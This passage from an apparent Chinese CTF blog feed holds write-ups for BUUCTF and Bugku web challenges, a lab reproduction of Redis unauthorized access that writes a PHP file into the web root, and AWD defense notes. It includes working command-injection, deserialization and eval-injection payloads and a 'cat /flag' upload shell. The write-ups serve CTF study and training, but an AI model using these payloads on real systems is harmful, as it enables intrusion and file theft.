punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造payload，利用extract($_POST)函数传入post数据重新覆盖数组中的值并且变量化：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token constant">_SESSION</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token operator">=</span>flagphpflagphpflagphpflagphp<span class="token operator">&amp;</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span><span class="token keyword">function</span><span class="token punctuation">]</span><span class="token operator">=</span>Yn8rt<span class="token string">";s:3:"</span>img<span class="token string">";s:20:"</span>ZDBnM19mMWFnLnBocA<span class="token operator">==</span><span class="token string">";s:2:"</span>dd<span class="token string">";s:1:"</span>a"<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B406%E6%9C%8808%E6%97%A51741_1.png" alt></p><pre><code>/d0g3_fllllllag=&gt;L2QwZzNfZmxsbGxsbGFn&lt;?php$b = base64_encode(&#39;/d0g3_fllllllag&#39;);echo $b;$a = &#39;L2QwZzNfZmxsbGxsbGFn&#39;;echo strlen($a);//20?&gt;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B406%E6%9C%8808%E6%97%A51747_2.png" alt></p><h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>利用的是键名的消失来包裹后面的数据使其失去原来的作用</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"flagphp] = ';s:5:"</span>Yn8rt<span class="token string">";s:3:"</span>img<span class="token string">";s:20:"</span>ZDBnM19mMWFnLnBocA<span class="token operator">==</span>"<span class="token punctuation">;</span><span class="token punctuation">}</span>'<span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//a:2:{s:7:"flagphp";s:52:";s:5:"Yn8rt";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B406%E6%9C%8808%E6%97%A51841_3.png" alt></p><h1 id="2021-06-09"><a href="#2021-06-09" class="headerlink" title="2021-06-09"></a>2021-06-09</h1><h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><h3 id="step1："><a href="#step1：" class="headerlink" title="step1："></a>step1：</h3><p>访问login.php</p><p>账号：zhangwei</p><p>密码：zhangwei<em>*</em></p><p>burpsuite简单一爆破，会得到密码为666</p><h3 id="step2："><a href="#step2：" class="headerlink" title="step2："></a>step2：</h3><p>然后利用scrabble来实现git泄露的源代码泄露问题：</p><pre><code>git clone https://github.com/denny0223/scrabble./scrabble https://xxx.xxx.xxx</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B406%E6%9C%8809%E6%97%A51639_1.png" alt></p><p>得到的代码很简陋，可能是不在当前版本</p><p>关于git的应用基础，在ctf中建议去了解一下ctfhub的Git泄露中的分支的Log：</p><p>1.git回滚：</p><p>根据null战队的书上写的，git作为一个版本控制工具，会记录每次提交的修改，所以当题目存在git泄露是，flag文件可以在修改中被删除或被覆盖率，这是我们可以利用git的<code>git reset</code>名来恢复到以前的版本：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B406%E6%9C%8809%E6%97%A51858_3.png" alt></p><p>然后利用git reset –hard 来恢复上一版本(这里我出现了问题，始终无法恢复)</p><p>恢复后的index.php：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//write_do.php</span><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"mysql.php"</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">case</span> <span class="token string">'write'</span><span class="token punctuation">:</span>    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> "insert into board            set category <span class="token operator">=</span> <span class="token string">'$category'</span><span class="token punctuation">,</span>                title <span class="token operator">=</span> <span class="token string">'$title'</span><span class="token punctuation">,</span>                content <span class="token operator">=</span> <span class="token string">'$content'</span>"<span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token string">'comment'</span><span class="token punctuation">:</span>    <span class="token variable">$bo_id</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'bo_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select category from board where id='$bo_id'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> "insert into comment            set category <span class="token operator">=</span> <span class="token string">'$category'</span><span class="token punctuation">,</span>                content <span class="token operator">=</span> <span class="token string">'$content'</span><span class="token punctuation">,</span>                bo_id <span class="token operator">=</span> <span class="token string">'$bo_id'</span>"<span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./comment.php?id=$bo_id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token punctuation">:</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="2021-06-20"><a href="#2021-06-20" class="headerlink" title="2021-06-20"></a>2021-06-20</h1><h2 id="网鼎杯-2018-Comment题目续集"><a href="#网鼎杯-2018-Comment题目续集" class="headerlink" title="[网鼎杯 2018]Comment题目续集"></a>[网鼎杯 2018]Comment题目续集</h2><p><a href="https://www.runoob.com/php/func-string-addslashes.html" target="_blank" rel="noopener">PHP addslashes() 函数</a>：对预定义的字符(<code>&#39;、&quot;、\</code>)进行转义</p><h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p>第三遍做此题，原理不原理的已经不重要了，只需要知道想要实现命令执行，就必须在输入的语句前面加上单引号并且需要有空格来做间隙</p><p>payload：</p><pre><code>&#39; -iL /flag -oN flag.txt &#39;</code></pre><p>system(‘python sqlmap .$_GET[‘a’]’)</p><p>?a=127.0 \’;ls</p><p>127.0 ‘ ;ls</p><p>escapeshellarg函数的存在，为了保障安全，会将单引号给转义，保证与前面的单引号不闭合</p><p><code>127.0 \&#39;;ls</code></p><p><code>&#39; 127.0 &#39;\&#39;&#39; ;ls &#39;</code></p><p>经过escapeshellcmd函数的转义操作，\和最后的单引号被一个接一个的转义掉了</p><p><code>&#39; 127.0 &#39; \\&#39; &#39; ;ls &#39;</code></p><p><code>&#39; 127.0 &#39; \\&#39; &#39; ;ls &#39;</code></p><p><code>&#39; 127.0 &#39; \ &#39; &#39;;ls \&#39;</code></p><p><code>&#39; 127.0 &#39; \ ;ls \&#39;</code></p><p>此时ls后面的单引号就是你要查看的名字为单引号的目录</p><p>也就是最后的情况就是<code>127.0\;ls&#39;</code></p><p>加工payload：</p><p><code>127&#39; -iL /flag -oN flag.txt &#39;</code></p><p><code>127&#39;\&#39;&#39;-iL /flag -oN flag.txt&#39;\&#39;&#39;</code></p><p><code>&#39;127&#39;\&#39;&#39;-iL /flag -oN flag.txt&#39;\&#39;&#39;&#39;</code></p><p>espaceshellcmd</p><p><code>&#39;127&#39;\\&#39;&#39;-iL /flag -oN flag.txt&#39;\\&#39;&#39;&#39;</code></p><p><code>&#39;127&#39;\\&#39;&#39;-iL /flag -oN flag.txt&#39;\\&#39;&#39;&#39;</code></p><p><code>&#39;127&#39;\-iL /flag -oN flag.txt&#39;\&#39;</code></p><p>总结：想要你后面参数的命令得到执行就要保证其中不含有escapeshellcmd要过滤的特殊字符，同时让你传入的句子被单引号包裹，同时用空格做间隙</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis未授权访问</title>
      <link href="/2021/05/23/redis-wei-shou-quan-fang-wen/"/>
      <url>/2021/05/23/redis-wei-shou-quan-fang-wen/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h1><h2 id="肉鸡准备步骤："><a href="#肉鸡准备步骤：" class="headerlink" title="肉鸡准备步骤："></a>肉鸡准备步骤：</h2><p>肉鸡ip：10.255.201.129</p><p>下载准备环境：</p><pre><code> wget http://download.redis.io/releases/redis-2.8.17.tar.gz tar -zxvf redis-2.8.17.tar.gz cd redis-2.8.17.tar.gz cd src make all ./redis-server</code></pre><h2 id="A机准备步骤："><a href="#A机准备步骤：" class="headerlink" title="A机准备步骤："></a>A机准备步骤：</h2><p>A机ip：10.255.201.128</p><p>需要有redis-cli来实现未授权访问的连接</p><p>需要知道你web服务的绝对路径</p><h1 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h1><pre class="line-numbers language-php"><code class="language-php">redis<span class="token operator">-</span>cli <span class="token operator">-</span>h <span class="token number">10.255</span><span class="token punctuation">.</span><span class="token number">201</span><span class="token punctuation">.</span><span class="token function">129</span><span class="token punctuation">(</span> <span class="token operator">-</span>p <span class="token number">6379</span><span class="token punctuation">)</span>keys <span class="token operator">*</span>  <span class="token comment" spellcheck="true">//用来查看该redis服务对公网开放，且未启用认证。</span>config set dir <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>wwwset xxx <span class="token string">"\n\n\n &lt;?php phpinfo();?> \n\n\n"</span>conifg set dbfilename shell<span class="token punctuation">.</span>phpsavequit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B405%E6%9C%8823%E6%97%A51935_1.png" alt></p><p>上传webshell成功：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B405%E6%9C%8823%E6%97%A51939_2.png" alt></p><p>参考笔记：<a href="https://www.cnblogs.com/bmjoker/p/9548962.html" target="_blank" rel="noopener">Redis未授权访问漏洞复现与利用</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWD笔记</title>
      <link href="/2021/04/25/awd-bi-ji/"/>
      <url>/2021/04/25/awd-bi-ji/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1815085049&auto=1&height=66"></iframe><h1 id="AWD初步要求"><a href="#AWD初步要求" class="headerlink" title="AWD初步要求"></a>AWD初步要求</h1><p>起因：4-24晚参加bugku的awd跌倒，凸显出的问题很多，故此开始爬起</p><h2 id="1-运用ssh命令连接靶机："><a href="#1-运用ssh命令连接靶机：" class="headerlink" title="1.运用ssh命令连接靶机："></a>1.运用ssh命令连接靶机：</h2><p>在kali中的命令：</p><pre><code>ssh team32@192-168-1-255.bugku.awd.cn -p 2222</code></pre><p>这里的ssh端口为2222，密码为队伍密码，但是需要修改为你自己的密码：</p><pre><code>su team32passwd</code></pre><h2 id="2-将网站源码备份"><a href="#2-将网站源码备份" class="headerlink" title="2.将网站源码备份"></a>2.将网站源码备份</h2><h3 id="熟悉cp命令："><a href="#熟悉cp命令：" class="headerlink" title="熟悉cp命令："></a>熟悉cp命令：</h3><pre><code>cp -r /var/www/html /tmp/test</code></pre><p>-r是选定/var/www/html这个目录下的所有子目录和文件</p><p>将/var/www/html下的所有子目录和文件复制到与/var同一个目录的/tmp目录下的test目录中，如果test不存在则会自动创建一个test目录</p><h3 id="将源码打包："><a href="#将源码打包：" class="headerlink" title="将源码打包："></a>将源码打包：</h3><h4 id="1-利用tar命令"><a href="#1-利用tar命令" class="headerlink" title="1.利用tar命令"></a>1.利用tar命令</h4><pre><code>tar -cvf name.tar /var/www/html</code></pre><p>将/var/www/html指打包/var/www/html这个路径里面的东西</p><p>​    -c参数是建立新的存档</p><p>​    -v参数详细显示处理的文件</p><p>​    -f参数指定存档或设备</p><p>​    打包之后如何解包：</p><pre><code>tar -xvf name.tar</code></pre><p>   上面这个解包命令将会将文档解开在当前目录下面。当然，你也可以用下面的这个命令来解包到指定的路径：</p><pre><code>tar -xvf name.tar -C /var/www     （解包的参数是-C，不是小写c）</code></pre><h4 id="2-利用zip命令"><a href="#2-利用zip命令" class="headerlink" title="2.利用zip命令"></a>2.利用zip命令</h4><p>目标文件html</p><p>将 /var/www/html/ 这个目录下所有文件和文件夹打包为当前目录下的 html.zip：</p><pre><code>zip -q -r html.zip /home/html</code></pre><p>如果在我们在 /var/www/html 目录下，可以执行以下命令：</p><pre><code>zip -q -r html.zip *</code></pre><p>参数理解：</p><ul><li>-q 不显示指令执行过程。</li><li>-r 递归处理，将指定目录下的所有文件和子目录一并处理。</li></ul><h3 id="运用xftp实现文件传输："><a href="#运用xftp实现文件传输：" class="headerlink" title="运用xftp实现文件传输："></a>运用xftp实现文件传输：</h3><p>首先安装vsftpd（如果在内网环境下参加比赛的话可能已经有了ftp功能了）</p><pre><code>apt install -y vsftpd # -y是一路默认yessystemctl enable vsftpd # 设置开机自启systemctl start vsftpd.service # 启动ftp服务systemctl status vsftpd.service # 查看ftp服务状态 </code></pre><p>然后利用xftp来实现文件传输，当然不可以作为root用户传输</p><p>如果使用team32用户连接则可能需要先将源码保存到该用户的资源下</p><pre><code>cp -r /var/www/html /home/team32/download</code></pre><p>然后利用xftp拖拽即可保存源码</p><h1 id="AWD防御阶段"><a href="#AWD防御阶段" class="headerlink" title="AWD防御阶段"></a>AWD防御阶段</h1><h2 id="文件上传漏洞："><a href="#文件上传漏洞：" class="headerlink" title="文件上传漏洞："></a>文件上传漏洞：</h2><h3 id="扫盲："><a href="#扫盲：" class="headerlink" title="扫盲："></a>扫盲：</h3><p><a href="https://www.runoob.com/linux/linux-comm-find.html" target="_blank" rel="noopener">Linux find 命令</a></p><p><a href="https://www.runoob.com/linux/linux-comm-rm.html" target="_blank" rel="noopener">Linux rm 命令</a></p><h3 id="操作："><a href="#操作：" class="headerlink" title="操作："></a>操作：</h3><p>1.他存在于/admin/upload.php中，vim编辑upload.php，在最后写入</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string">"success"</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2.删除upload文件夹下的所有文件</p><p>3.利用命令：</p><pre><code>find /var/www/html/ -name &quot;*.php&quot; | xargs grep &quot;eval&quot;;find /var/www/html/ -name &quot;*.php&quot; | xargs grep &quot;system&quot;;</code></pre><p>找到含有危险函数的php文件，记住名字利用：</p><pre><code>rm -rf 1.php 2.php</code></pre><p>删除已经存在的一句话木马</p><ul><li>-f 即使原档案属性设为唯读，亦直接删除，无需逐一确认。</li><li>-r 将目录及以下之档案亦逐一删除。</li></ul><h2 id="命令执行漏洞："><a href="#命令执行漏洞：" class="headerlink" title="命令执行漏洞："></a>命令执行漏洞：</h2><p>利用命令：</p><pre><code>find /var/www/html/ -name &quot;*.php&quot; | xargs grep &quot;system&quot;;</code></pre><p>来查找危险函数，然后根据找到的文件</p><h2 id="SQL注入漏洞："><a href="#SQL注入漏洞：" class="headerlink" title="SQL注入漏洞："></a>SQL注入漏洞：</h2><p>首先你需要找到存在sql注入的点，由于一开始的时间不充足，可以采取将页面静态化的策略，直接修改from后面表的名字，这样对手就无法得到任何信息，在后续将大部分漏洞修补完毕以后再采取如下措施</p><p>防御监控攻击tail -f *.log</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku刷题记录</title>
      <link href="/2021/04/08/bugku-shua-ti-ji-lu/"/>
      <url>/2021/04/08/bugku-shua-ti-ji-lu/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=569213220&auto=1&height=66"></iframe><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Flask-FileUpload"><a href="#Flask-FileUpload" class="headerlink" title="Flask_FileUpload"></a>Flask_FileUpload</h2><p>这是关于py的文件上传</p><p>图片马:</p><pre><code>import osos.system(&#39;cat /flag&#39;)</code></pre><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>f12里面</p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>前端限制了输入的位数</p><p>修改即可</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>题目：</p><pre><code>$what=$_GET[&#39;what&#39;];echo $what;if($what==&#39;flag&#39;)echo &#39;flag{****}&#39;;</code></pre><p>payload:</p><pre><code>?what=flag</code></pre><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><pre><code>$what=$_POST[&#39;what&#39;];echo $what;if($what==&#39;flag&#39;)echo &#39;flag{****}&#39;;</code></pre><p>post传参</p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>hints：矛盾</p><pre><code>$num=$_GET[&#39;num&#39;];if(!is_numeric($num)){echo $num;if($num==1)echo &#39;flag{**********}&#39;;}</code></pre><p>payload：</p><pre><code>?num=1e</code></pre><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>f12得到：</p><pre><code>&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#123;&amp;#49;&amp;#53;&amp;#102;&amp;#52;&amp;#101;&amp;#98;&amp;#48;&amp;#97;&amp;#102;&amp;#97;&amp;#51;&amp;#99;&amp;#101;&amp;#97;&amp;#54;&amp;#101;&amp;#50;&amp;#99;&amp;#51;&amp;#100;&amp;#48;&amp;#52;&amp;#50;&amp;#97;&amp;#50;&amp;#49;&amp;#100;&amp;#56;&amp;#50;&amp;#48;&amp;#52;&amp;#56;&amp;#125;</code></pre><p>Unicode转ascii得到flag</p><h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>hints：你必须让他停下</p><p>抓一个包即可，发送到repeater不断重放，一帧一帧的分析</p><h2 id="社工-初步收集"><a href="#社工-初步收集" class="headerlink" title="社工-初步收集"></a>社工-初步收集</h2><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><pre class="line-numbers language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span> <span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span> <span class="token variable">$a</span> <span class="token operator">=</span> @<span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">eval</span><span class="token punctuation">(</span> <span class="token string">"var_dump($a);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload：</p><pre><code>?hello=);show_source(&#39;flag.php&#39;</code></pre><p><a href="https://www.runoob.com/php/func-misc-show-source.html" target="_blank" rel="noopener">PHP show_source() 函数</a></p><h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><pre class="line-numbers language-php"><code class="language-php">flag In the variable <span class="token operator">!</span> <span class="token delimiter">&lt;?php</span>  <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string">"flag1.php"</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$args</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^\w+$/"</span><span class="token punctuation">,</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"args error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"var_dump($$args);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输入的参数中必须有字母或者数字或者_+$</p><p>payload：</p><pre><code>?args=GLOBALS</code></pre><h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>hints:头等舱</p><p><a href="https://www.cnblogs.com/wangshuazi/p/9809756.html" target="_blank" rel="noopener">header头中有信息</a>：抓包看头信息即可</p><h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p>hints：网站被黑了 黑客会不会留下后门</p><p>利用御剑扫描一下后台发现shell.php文件，打开以后发现是hacker留下的木马登陆程度，利用burp抓包进行一个爆破得到密码是hack，即可得到flag</p><h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>hints：本地管理员</p><p>考查<a href="https://www.runoob.com/w3cnote/http-x-forwarded-for.html" target="_blank" rel="noopener">HTTP  X-Forwarded-For</a>一个http扩展头信息</p><p>X-Forwarded-For:127.0.0.1</p><p>账户admin密码test123在源代码的注释里面有base64解码即可</p><h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p>hint：看看源代码？</p><p>源代码：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">var</span> p1 <span class="token operator">=</span> <span class="token 